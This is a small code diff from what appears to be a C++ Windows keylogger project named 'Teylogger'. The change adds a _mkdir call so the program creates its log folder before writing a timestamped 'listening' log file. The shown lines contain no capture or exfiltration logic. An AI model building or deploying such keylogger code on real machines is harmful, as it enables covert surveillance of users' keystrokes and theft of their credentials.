@@ -6,6 +6,7 @@
 #include <fstream>
 #include <stdio.h>
 #include <string.h>
+#include <direct.h>
 #include <windows.h>
 #define LOGO "  _____            _                            \n |_   _|___  _  _ | | ___  __ _  __ _  ___  _ _ \n   | | / -_)| || || |/ _ \\/ _` |/ _` |/ -_)| '_|\n   |_| \\___| \\_, ||_|\\___/\\__, |\\__, |\\___||_|  \n             |__/         |___/ |___/   "
 #define AUTHOR "@uynilo9"
@@ -42,6 +43,7 @@ int main(int argc, char* argv[]) {
                 teylogger(), error("Something went wrong"), printf("\n");
                 return 1;
             } else {
+                _mkdir("C:\\Teylogger\\logs");
                 std::fstream file;
                 file.open("C:\\Teylogger\\logs\\temp.txt", std::ios::out | std::ios::trunc);
                 file << "[THIS LOG WAS STARTING LISTENING AT " << now() << "]\n";
